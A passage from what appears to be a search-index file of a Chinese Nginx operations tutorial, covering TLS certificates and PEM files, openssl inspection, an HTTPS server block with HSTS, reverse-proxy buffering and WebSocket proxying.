\u200b\u534f\u8bae\u200b\u51b3\u5b9a\u200b\u4e86\u200b\uff0c\u200b\u80fd\u4e3a\u200b\u57df\u540d\u200b\u7533\u8bf7\u200b\u5230\u200b\u6709\u6548\u200b\u8bc1\u4e66\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u7533\u8bf7\u200b\u65b9\u5bf9\u200b\u57df\u540d\u200b\u6709\u200b\u63a7\u5236\u6743\u200b\u3002\u200b\u5e76\u4e14\u200b\uff0c\u200b\u73b0\u5728\u200b\u6240\u6709\u200b\u8bc1\u4e66\u200b\u7b7e\u7f72\u200b\u90fd\u200b\u6709\u200b\u8bc1\u4e66\u200b\u900f\u660e\u5ea6\u200b\uff08Certificate Transparency\uff0cCT\uff09\u200b\u673a\u5236\u200b\uff0c\u200b\u4efb\u4f55\u4eba\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u67e5\u8be2\u200b\u5230\u200b\u67d0\u4e2a\u200b\u57df\u540d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8bc1\u4e66\u200b\u7b7e\u7f72\u200b\u8bb0\u5f55\u200b\u3002\u200b\u56e0\u6b64\u200b\u60f3\u8981\u200b\u9a97\u200b\u7b7e\u8bc1\u200b\u4e66\u200b\u96be\u5ea6\u5f88\u5927\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5f88\u200b\u5bb9\u6613\u200b\u88ab\u200b\u53d1\u73b0\u200b\u3002</p> </li> <li>\u200b\u5b89\u5168\u6027\u200b\u4e0d\u200b\u53d6\u51b3\u4e8e\u200b\u82b1\u200b\u4e86\u200b\u591a\u5c11\u200b\u94b1\u200b\uff0c\u200b\u800c\u662f\u200b\u53d6\u51b3\u4e8e\u200b\u5177\u4f53\u200b\u5b9e\u8df5\u200b\u3002ACME \u200b\u534f\u8bae\u200b\u652f\u6301\u200b\u81ea\u52a8\u5316\u200b\u7b7e\u7f72\u200b\u3001\u200b\u7eed\u671f\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5927\u5927\u964d\u4f4e\u200b\u4eba\u4e3a\u200b\u64cd\u4f5c\u5931\u8bef\u200b\uff08\u200b\u5305\u62ec\u200b\u6cc4\u6f0f\u200b\u79c1\u94a5\u200b\u3001\u200b\u5fd8\u8bb0\u200b\u7eed\u671f\u200b\uff09\u200b\u7684\u200b\u98ce\u9669\u200b\u3002\u200b\u800c\u200b\u5982\u679c\u200b\u82b1\u200b\u4e86\u200b\u94b1\u200b\u4e70\u200b\u4e86\u200b EV \u200b\u8bc1\u4e66\u200b\uff0c\u200b\u4f46\u662f\u200b\u6700\u540e\u200b\u90e8\u7f72\u200b\u7684\u200b\u65f6\u5019\u200b\u5374\u662f\u200b\u901a\u8fc7\u200b\u5fae\u4fe1\u200b\uff08\u200b\u6211\u200b\u542c\u8bf4\u200b\u8fc7\u200b\u4e0d\u6b62\u200b\u4e00\u4f8b\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u60c5\u51b5\u200b\uff09\u200b\u7ed9\u200b\u5bf9\u5e94\u200b\u670d\u52a1\u200b\u7684\u200b\u8fd0\u7ef4\u200b\u4f20\u9012\u200b\u8bc1\u4e66\u200b\u79c1\u94a5\u200b\uff0c\u200b\u90a3\u200b\u5b89\u5168\u6027\u200b\u53cd\u800c\u200b\u5927\u5927\u964d\u4f4e\u200b\u4e86\u200b\uff0c\u200b\u8fdc\u4e0d\u5982\u200b\u81ea\u52a8\u5316\u200b\u7684\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\u3002</li> </ol> <p>Debian \u200b\u7684\u200b snakeoil \u200b\u81ea\u200b\u7b7e\u540d\u200b\u8bc1\u4e66\u200b</p> <p>Debian \u200b\u7cfb\u7edf\u200b\u7684\u200b <code>ssl-cert</code> \u200b\u5305\u200b\u81ea\u5e26\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u81ea\u200b\u7b7e\u540d\u200b\u7684\u200b\u6d4b\u8bd5\u200b\u8bc1\u4e66\u200b\u3002\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8bc1\u4e66\u200b\u5728\u200b <code>/etc/ssl/certs/ssl-cert-snakeoil.pem</code>\uff0c\u200b\u79c1\u94a5\u200b\u5728\u200b <code>/etc/ssl/private/ssl-cert-snakeoil.key</code>\u3002\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5b83\u200b\u672c\u5730\u200b\u6d4b\u8bd5\u200b HTTPS \u200b\u914d\u7f6e\u200b\uff0c\u200b\u4f46\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u751f\u6210\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\uff1a</p> <pre><code>make-ssl-cert generate-default-snakeoil -f\n</code></pre> <p>\u200b\u4ee5\u4e0b\u200b\u5047\u8bbe\u200b\u4f60\u200b\u7684\u200b\u8bc1\u4e66\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>/etc/nginx/ssl/example.com.crt</code> \u200b\u548c\u200b <code>/etc/nginx/ssl/example.com.key</code>\u3002</p> <p>\u200b\u8bc1\u4e66\u200b\u683c\u5f0f\u200b</p> <p>PEM \u200b\u683c\u5f0f\u200b\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u8bc1\u4e66\u200b\u683c\u5f0f\u200b\u3002\u200b\u5176\u200b\u5185\u5bb9\u200b\u4e3a\u200b\u7eaf\u200b\u6587\u672c\u200b\uff0c\u200b\u5305\u542b\u200b base64 \u200b\u7f16\u7801\u200b\u7684\u200b\u76f8\u5173\u200b\u6570\u636e\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u8bc1\u4e66\u200b\uff08\u200b\u4e00\u822c\u200b\u4e3a\u200b <code>pem</code>\u3001<code>crt</code> \u200b\u6216\u8005\u200b <code>cer</code> \u200b\u540e\u7f00\u200b\uff09\uff1a</p> <pre><code>-----BEGIN CERTIFICATE-----\n\uff08base64 \u200b\u7f16\u7801\u200b\u7684\u200b\u6570\u636e\u200b\uff09\n-----END CERTIFICATE-----\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b\u79c1\u94a5\u200b\uff08\u200b\u4e00\u822c\u200b\u4e3a\u200b <code>pem</code> \u200b\u6216\u200b <code>key</code> \u200b\u540e\u7f00\u200b\uff09\uff1a</p> <pre><code>-----BEGIN PRIVATE KEY-----\n\uff08base64 \u200b\u7f16\u7801\u200b\u7684\u200b\u6570\u636e\u200b\uff09\n-----END PRIVATE KEY-----\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b OpenSSL \u200b\u5de5\u5177\u200b\u67e5\u770b\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>openssl x509 -in example.crt -text -noout  # \u200b\u67e5\u770b\u200b\u8bc1\u4e66\u200b\u4fe1\u606f\u200b\nopenssl pkey -in example.key -text -noout  # \u200b\u68c0\u67e5\u200b\u79c1\u94a5\u200b\n</code></pre> <p>fullchain.pem</p> <p>\u200b\u4e00\u4e9b\u200b ACME \u200b\u5ba2\u6237\u7aef\u200b\u4f1a\u200b\u751f\u6210\u200b <code>fullchain.pem</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5b83\u200b\u5305\u542b\u200b\u4e86\u200b\u670d\u52a1\u5668\u200b\u8bc1\u4e66\u200b\u548c\u200b\u4e2d\u95f4\u200b\u8bc1\u4e66\u200b\u7684\u200b\u5b8c\u6574\u200b\u94fe\u200b\u3002\u200b\u5982\u679c\u200b\u5b58\u5728\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u8bf7\u200b\u4f18\u5148\u200b\u4f7f\u7528\u200b\u5b83\u200b\uff0c\u200b\u5426\u5219\u200b\u6d4f\u89c8\u5668\u200b\u4ee5\u5916\u200b\u7684\u200b\u5176\u4ed6\u200b\u5ba2\u6237\u7aef\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u56e0\u4e3a\u200b\u7f3a\u5c11\u200b\u4e2d\u95f4\u200b\u8bc1\u4e66\u200b\u800c\u200b\u65e0\u6cd5\u200b\u9a8c\u8bc1\u200b\u8bc1\u4e66\u200b\u94fe\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#tls-configuration","title":"TLS \u200b\u914d\u7f6e","text":"<p>\u200b\u7136\u540e\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u5728\u200b Nginx \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u6dfb\u52a0\u200b TLS \u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>server {\n    listen 443 ssl;  # \u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\n    server_name example.com;  # \u200b\u6307\u5b9a\u200b\u7684\u200b\u57df\u540d\u200b\n    root /var/www/example.com;  # \u200b\u7f51\u7ad9\u200b\u6839\u76ee\u5f55\u200b\n\n    ssl_certificate /etc/nginx/ssl/example.com.crt;  # TLS \u200b\u8bc1\u4e66\u200b\u8def\u5f84\u200b\n    ssl_certificate_key /etc/nginx/ssl/example.com.key;  # TLS \u200b\u8bc1\u4e66\u200b\u5bc6\u94a5\u200b\u8def\u5f84\u200b\n\n    # \uff08\u200b\u53ef\u200b\u9009\u200b\uff09SSL \u200b\u8bbe\u7f6e\u200b\n    ssl_protocols TLSv1.2 TLSv1.3;  # \u200b\u542f\u7528\u200b\u7684\u200b TLS \u200b\u534f\u8bae\u200b\uff08\u200b\u9ed8\u8ba4\u503c\u200b\uff09\n    ssl_ciphers 'HIGH:!aNULL:!MD5';  # \u200b\u4f7f\u7528\u200b\u7684\u200b\u52a0\u5bc6\u200b\u5957\u4ef6\u200b\uff08\u200b\u9ed8\u8ba4\u503c\u200b\uff09\n    ssl_prefer_server_ciphers on;  # \u200b\u4f18\u5148\u200b\u4f7f\u7528\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u52a0\u5bc6\u200b\u5957\u4ef6\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b off\uff09\n    ssl_session_cache shared:SSL:10m;  # TLS \u200b\u4f1a\u8bdd\u200b\u7f13\u5b58\u200b\u5927\u5c0f\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u6ca1\u6709\u200b\u7f13\u5b58\u200b\uff09\n    ssl_session_timeout 10m;  # TLS \u200b\u4f1a\u8bdd\u200b\u8d85\u65f6\u200b\u65f6\u95f4\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 5m\uff09\n\n    # \uff08\u200b\u53ef\u200b\u9009\u200b\uff09HSTS\uff08HTTP Strict Transport Security\uff09\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}\n</code></pre> <p>\u200b\u6ce8\u610f\u200b\u5230\u200b\u548c\u200b\u524d\u6587\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u76d1\u542c\u200b\u7aef\u53e3\u200b\u662f\u200b 443\uff0c\u200b\u800c\u4e14\u200b\u589e\u52a0\u200b\u4e86\u200b <code>ssl</code> \u200b\u9009\u9879\u200b\u3002<code>ssl_certificate</code> \u200b\u548c\u200b <code>ssl_certificate_key</code> \u200b\u5206\u522b\u200b\u6307\u5b9a\u200b\u4e86\u200b TLS \u200b\u8bc1\u4e66\u200b\u548c\u200b\u5bc6\u94a5\u200b\u7684\u200b\u8def\u5f84\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b TLS \u200b\u662f\u200b\u52a0\u5bc6\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b Nginx \u200b\u662f\u200b\u600e\u4e48\u200b\u5728\u200b\u63e1\u624b\u200b\u9636\u6bb5\u200b\u77e5\u9053\u200b\u8981\u200b\u7528\u200b\u54ea\u4e2a\u200b <code>server</code> \u200b\u5757\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u91cc\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8bc1\u4e66\u200b\u5462\u200b\uff1f</p> <p>\u200b\u5728\u200b TLS \u200b\u63e1\u624b\u200b\u9636\u6bb5\u200b\uff0c\u200b\u7edd\u5927\u591a\u6570\u200b\u5ba2\u6237\u7aef\u200b\u90fd\u200b\u4f1a\u200b\u53d1\u9001\u200b SNI\uff08Server Name Indication\uff0c\u200b\u670d\u52a1\u5668\u200b\u540d\u79f0\u200b\u6307\u793a\u200b\uff09\u200b\u4fe1\u606f\u200b\uff0c\u200b\u544a\u8bc9\u200b\u670d\u52a1\u5668\u200b\u5b83\u200b\u60f3\u8981\u200b\u8fde\u63a5\u200b\u7684\u200b\u57df\u540d\u200b\u3002SNI \u200b\u662f\u200b\u660e\u6587\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u670d\u52a1\u5668\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b SNI \u200b\u4fe1\u606f\u200b\u6765\u200b\u9009\u62e9\u200b\u5bf9\u5e94\u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\u548c\u200b\u8bc1\u4e66\u200b\u3002</p> <p>\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u8fd8\u200b\u63d0\u5230\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u53ef\u9009\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5982\u200b\u4e2d\u95f4\u200b\u8bc1\u4e66\u200b\u3001TLS \u200b\u8bbe\u7f6e\u200b\u3001HSTS \u200b\u7b49\u200b\u3002\u200b\u4e00\u822c\u200b\u5efa\u8bae\u200b\u8bbe\u7f6e\u200b <code>ssl_protocols TLSv1.2 TLSv1.3;</code>\uff0c\u200b\u56e0\u4e3a\u200b SSLv3\u3001TLSv1.0 \u200b\u548c\u200b TLSv1.1 \u200b\u7b49\u200b\u65e7\u200b\u7684\u200b\u52a0\u5bc6\u534f\u8bae\u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u88ab\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u5b89\u5168\u200b\u7684\u200b\u4e86\u200b\u3002</p> <p>HSTS \u200b\u662f\u200b\u4e00\u79cd\u200b\u5b89\u5168\u200b\u673a\u5236\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5f3a\u5236\u200b\u5ba2\u6237\u7aef\u200b\uff08\u200b\u6d4f\u89c8\u5668\u200b\uff09\u200b\u4f7f\u7528\u200b HTTPS \u200b\u8bbf\u95ee\u200b\u7f51\u7ad9\u200b\u3002\u200b\u5f53\u200b\u7528\u6237\u200b\u9996\u6b21\u200b\u8bbf\u95ee\u200b\u652f\u6301\u200b HSTS \u200b\u7684\u200b\u7f51\u7ad9\u200b\u65f6\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4f1a\u200b\u901a\u8fc7\u200b HTTP \u200b\u6216\u200b HTTPS \u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5982\u679c\u200b\u7f51\u7ad9\u200b\u652f\u6301\u200b HSTS\uff0c\u200b\u670d\u52a1\u5668\u200b\u4f1a\u200b\u5728\u200b\u54cd\u5e94\u200b\u4e2d\u200b\u5305\u542b\u200b <code>Strict-Transport-Security</code> \u200b\u5934\u90e8\u200b\uff0c\u200b\u6307\u793a\u200b\u6d4f\u89c8\u5668\u200b\u8be5\u200b\u7f51\u7ad9\u200b\u5e94\u4ec5\u200b\u901a\u8fc7\u200b HTTPS \u200b\u8bbf\u95ee\u200b\u3002<code>add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;</code> \u200b\u8868\u793a\u200b\u542f\u7528\u200b HSTS\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4f1a\u200b\u5728\u200b 1 \u200b\u5e74\u5185\u200b\u5f3a\u5236\u200b\u4f7f\u7528\u200b HTTPS \u200b\u8bbf\u95ee\u200b\u7f51\u7ad9\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5305\u62ec\u200b\u5b50\u200b\u57df\u540d\u200b\u3002</p> <p>\u200b\u8d2d\u4e70\u200b\u57df\u540d\u200b\u4e4b\u524d\u200b\u6ce8\u610f\u200b\u4e00\u4e0b\u200b HSTS \u200b\u9884\u200b\u52a0\u8f7d\u200b\u5217\u8868\u200b\u54e6\u200b\uff01</p> <p>HSTS \u200b\u9884\u200b\u52a0\u8f7d\u200b\u5217\u8868\u200b\uff08HSTS Preload List\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7531\u200b\u6d4f\u89c8\u5668\u200b\u7ef4\u62a4\u200b\u7684\u200b\u5217\u8868\u200b\uff0c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u5217\u8868\u200b\u91cc\u9762\u200b\u7684\u200b\u7f51\u7ad9\u200b\u6d4f\u89c8\u5668\u200b\u5728\u200b\u8bbf\u95ee\u200b\u65f6\u200b\u5fc5\u987b\u200b\u4f7f\u7528\u200b HTTPS\u3002\u200b\u5982\u679c\u200b\u4e70\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5728\u200b HSTS \u200b\u9884\u200b\u52a0\u8f7d\u200b\u5217\u8868\u200b\u4e0a\u9762\u200b\u7684\u200b\u57df\u540d\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u60f3\u200b\u7528\u200b HTTPS \u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e8b\u60c5\u200b\u5c31\u200b\u4f1a\u200b\u975e\u5e38\u200b\u9ebb\u70e6\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e00\u4e9b\u200b TLD\uff08\u200b\u9876\u7ea7\u200b\u57df\u200b\uff09\u200b\u4e5f\u200b\u88ab\u200b\u52a0\u5165\u200b\u5230\u200b\u4e86\u200b HSTS \u200b\u9884\u200b\u52a0\u8f7d\u200b\u5217\u8868\u200b\u4e2d\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>.dev</code> \u200b\u7b49\u200b\u3002</p> <p>\u200b\u8bbf\u95ee\u200b HTTP \u200b\u81ea\u52a8\u200b\u8df3\u8f6c\u200b\u5230\u200b HTTPS \u200b\u7684\u200b\u914d\u7f6e\u200b</p> <p>\u200b\u5047\u8bbe\u200b\u5e0c\u671b\u200b\u8ba9\u200b\u7528\u6237\u200b\u8bbf\u95ee\u200b <code>http://example.com</code> \u200b\u65f6\u200b\u81ea\u52a8\u200b\u8df3\u8f6c\u200b\u5230\u200b <code>https://example.com</code>\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b <code>server</code> \u200b\u5757\u200b\u8981\u200b\u600e\u4e48\u200b\u5199\u200b\u5462\u200b\uff1f\uff08\u200b\u63d0\u793a\u200b\uff1a<code>return</code> \u200b\u6307\u4ee4\u200b\uff1bHTTP 301 \u200b\u662f\u200b\u6c38\u4e45\u200b\u91cd\u5b9a\u5411\u200b\uff09</p>"},{"location":"ops/network-service/nginx/#reverse-proxy-load-balancing","title":"\u53cd\u5411\u200b\u4ee3\u7406\u200b\u4e0e\u200b\u8d1f\u8f7d\u200b\u5747\u8861","text":"<p>\u200b\u5728\u200b\u7ad9\u70b9\u200b\u914d\u7f6e\u200b\u7b80\u4ecb\u200b\u90e8\u5206\u200b\uff0c\u200b\u6211\u4eec\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u914d\u7f6e\u200b\u793a\u4f8b\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0cNginx \u200b\u7684\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u529f\u80fd\u200b\u975e\u5e38\u200b\u5f3a\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u3001\u200b\u7f13\u5b58\u200b\u3001\u200b\u8bf7\u6c42\u200b\u4fee\u6539\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#reverse-proxy-misc","title":"\u53cd\u5411\u200b\u4ee3\u7406\u200b\u6742\u9879\u200b\u914d\u7f6e","text":"<p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u914d\u7f6e\u200b\u9009\u9879\u200b\uff1a</p> <pre><code>location / {\n    proxy_pass http://backend_server;  # \u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u7684\u200b\u5730\u5740\u200b\n    # \u200b\u8bbe\u7f6e\u200b header \u200b\u90e8\u5206\u200b\u7565\u8fc7\u200b\n    proxy_buffering on;  # \u200b\u542f\u7528\u200b buffering\uff08\u200b\u9ed8\u8ba4\u200b\u542f\u7528\u200b\uff09\n    proxy_ssl_server_name on;  # \u200b\u5411\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u53d1\u9001\u200b SNI\uff08\u200b\u9ed8\u8ba4\u200b\u5173\u95ed\u200b\uff09\n    proxy_connect_timeout 10s;  # \u200b\u8fde\u63a5\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u8d85\u65f6\u200b\u65f6\u95f4\u200b\uff08\u200b\u9ed8\u8ba4\u200b 60s\uff09\n    proxy_max_temp_file_size 128m;  # \u200b\u4e34\u65f6\u6587\u4ef6\u200b\u7684\u200b\u6700\u5927\u200b\u5927\u5c0f\u200b\uff08\u200b\u9ed8\u8ba4\u200b 1024m\uff09\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u6bd4\u8f83\u200b\u91cd\u8981\u200b\u7684\u200b\u914d\u7f6e\u200b\u662f\u200b buffering \u200b\u7684\u200b\u542f\u7528\u200b\u4e0e\u5426\u200b\u3002\u200b\u5728\u200b\u542f\u7528\u200b buffering \u200b\u7684\u200b\u65f6\u5019\u200b\uff0cNginx \u200b\u5728\u200b\u6536\u5230\u200b\u540e\u200b\u7aef\u200b\u6570\u636e\u200b\u540e\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u7acb\u523b\u200b\u7ed9\u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u800c\u662f\u200b\u5148\u200b\u5c06\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u5728\u200b\u5185\u5b58\u200b\u6216\u8005\u200b\u4e34\u65f6\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u53d1\u9001\u200b\uff0c\u200b\u4ee5\u6b64\u200b\u63d0\u9ad8\u200b\u541e\u5410\u91cf\u200b\u3002\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u5ef6\u8fdf\u200b\u654f\u611f\u200b\u7684\u200b\u5e94\u7528\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u6709\u9650\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u5173\u95ed\u200b buffering\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e00\u4e9b\u200b\u5e94\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u6dfb\u52a0\u200b WebSocket \u200b\u652f\u6301\u200b\u3002</p> <p>WebSocket \u200b\u662f\u200b\u4ec0\u4e48\u200b\uff1f</p> <p>\u200b\u5728\u200b\u73b0\u4ee3\u200b\u7f51\u7ad9\u200b\u5f00\u53d1\u200b\u65f6\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u5b58\u5728\u200b\u7684\u200b\u4e00\u79cd\u200b\u9700\u6c42\u200b\u662f\u200b\uff1a\u200b\u670d\u52a1\u7aef\u200b\u9700\u8981\u200b\u4e3b\u52a8\u200b\u5411\u200b\u5ba2\u6237\u7aef\u200b\u63a8\u9001\u200b\u6570\u636e\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4ec5\u4ec5\u200b\u88ab\u52a8\u200b\u5730\u200b\u54cd\u5e94\u200b\u5ba2\u6237\u7aef\u200b\uff08\u200b\u6d4f\u89c8\u5668\u200b\uff09\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5982\u679c\u200b\u8ba9\u200b\u6d4f\u89c8\u5668\u200b\u5b9a\u671f\u200b\u8f6e\u8be2\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u65e2\u200b\u6d6a\u8d39\u8d44\u6e90\u200b\uff0c\u200b\u53c8\u200b\u589e\u52a0\u200b\u5ef6\u8fdf\u200b\u3002WebSocket \u200b\u534f\u8bae\u200b\u6b63\u662f\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u800c\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u3002\u200b\u5b83\u200b\u5141\u8bb8\u200b\u5728\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u4e4b\u95f4\u200b\u5efa\u7acb\u200b\u4e00\u4e2a\u200b\u6301\u4e45\u200b\u7684\u200b\u53cc\u5411\u901a\u4fe1\u200b\u901a\u9053\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u5b9e\u65f6\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002</p> <p>WebSocket \u200b\u534f\u8bae\u200b\u5728\u200b\u534f\u5546\u200b\u65f6\u4f1a\u200b\u5148\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b HTTP/1.1 \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5305\u542b\u200b <code>Upgrade: websocket</code> \u200b\u4e0e\u200b <code>Connection: Upgrade</code> \u200b\u5934\u200b\uff0c\u200b\u8868\u793a\u200b\u8bf7\u6c42\u200b\u5347\u7ea7\u200b\u5230\u200b WebSocket \u200b\u534f\u8bae\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u793a\u4f8b\u200b\uff1a</p> <pre><code>http {\n    # ...\n    map $http_upgrade $connection_upgrade {\n        default upgrade;\n        ''      close;\n    }\n\n    server {\n        # ...\n\n        location / {\n            # \u200b\u5176\u4ed6\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u914d\u7f6e\u200b\u7565\u8fc7\u200b\n            proxy_http_version 1.1;  # \u200b\u4f7f\u7528\u200b HTTP/1.1 \u200b\u534f\u8bae\u200b\n            proxy_set_header Upgrade $http_upgrade;  # \u200b\u652f\u6301\u200b WebSocket \u200b\u5347\u7ea7\u200b\n            proxy_set_header Connection $connection_upgrade;  # \u200b\u652f\u6301\u200b WebSocket \u200b\u8fde\u63a5\u200b\n        }\n    }\n}\n</code></pre> <p>\u200b\u4ee5\u200b <code>$http_</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u53d8\u91cf\u200b</p> <p>Nginx \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5c06\u200b\u6240\u6709\u200b HTTP \u200b\u8bf7\u6c42\u200b\u5934\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u4ee5\u200b <code>$http_</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u53d8\u91cf\u200b\uff0c\u200b\u53d8\u91cf\u540d\u200b\u4e2d\u200b\u7684\u200b\u8fde\u200b\u5b57\u7b26\u200b <code>-</code> \u200b\u4f1a\u200b\u88ab\u200b\u66ff\u6362\u200b\u4e3a\u200b\u4e0b\u5212\u7ebf\u200b <code>_</code>\u3002\u200b\u4f8b\u5982\u200b\uff0cHTTP \u200b\u8bf7\u6c42\u200b\u5934\u200b <code>Upgrade</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b\u53d8\u91cf\u200b\u662f\u200b <code>$http_upgrade</code>\uff0c<code>User-Agent</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b\u53d8\u91cf\u200b\u662f\u200b <code>$http_user_agent</code>\u3002</p> <p>\u200b\u8fd9\u91cc\u200b <code>map</code> \u200b\u6307\u4ee4\u200b\u5fc5\u987b\u200b\u5728\u200b <code>http</code> \u200b\u5757\u200b\u4e2d\u200b\uff0c\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4ece\u200b HTTP \u200b\u8bf7\u6c42\u200b\u7684\u200b <code>Upgrade</code> \u200b\u5934\u5230\u200b <code>$connection_upgrade</code> \u200b\u53d8\u91cf\u200b\u7684\u200b\u6620\u5c04\u200b\u5173\u7cfb\u200b\u3002</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u80fd\u200b <code>proxy_set_header Connection $http_connection</code>\uff1f</p> <p>\u200b\u5728\u200b HTTP \u200b\u6807\u51c6\u200b\u4e2d\u200b\uff0c<code>Connection</code> \u200b\u5934\u200b\u662f\u200b hop-by-hop 